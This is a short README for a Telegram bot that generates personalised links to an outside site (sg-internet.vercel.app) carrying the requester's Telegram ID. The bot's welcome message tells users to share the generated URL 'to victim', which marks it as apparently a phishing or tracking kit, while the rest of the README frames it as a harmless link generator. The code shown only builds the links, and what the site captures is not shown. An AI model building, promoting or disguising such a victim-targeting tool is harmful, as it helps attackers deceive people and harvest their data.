# Link Generator Telegram Bot

A Telegram bot that generates custom URLs for users. The bot creates personalized links that include the user's Telegram ID.

## Features

- Generates unique URLs for each user
- Simple two-command interface
- Automatic user ID integration

## Commands

### `/start`
Displays the welcome message and basic usage instructions for the bot.

```javascript
Bot.sendMessage("WELCOME  ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
```

### `/create`
Generates a personalized URL containing the user's Telegram ID.

```javascript
let userId = user.telegramid;
let url = "https://sg-internet.vercel.app/?id=" + userId;
Bot.sendMessage("YOUR URL:\n" + url + "\n\nMADE BY <b>@SG_Modder</b>", { parse_mode: "HTML" });
```

## Usage

1. Start the bot by sending `/start`
2. Use the `/create` command to generate your personalized URL
3. Share the generated URL with others

## Base URL

The bot uses the following base URL for link generation:
```
https://sg-internet.vercel.app/
```

## Parameters

- `id`: User's Telegram ID (automatically added to the URL)

## Credits

Created by @SG_Modder

## Technical Notes

- The bot uses HTML parsing mode for message formatting
- User IDs are automatically extracted from the Telegram context
- URLs are generated dynamically based on the user's ID

## Security Considerations

- Each URL is unique to the user's Telegram ID
- Users can only generate URLs for their own ID
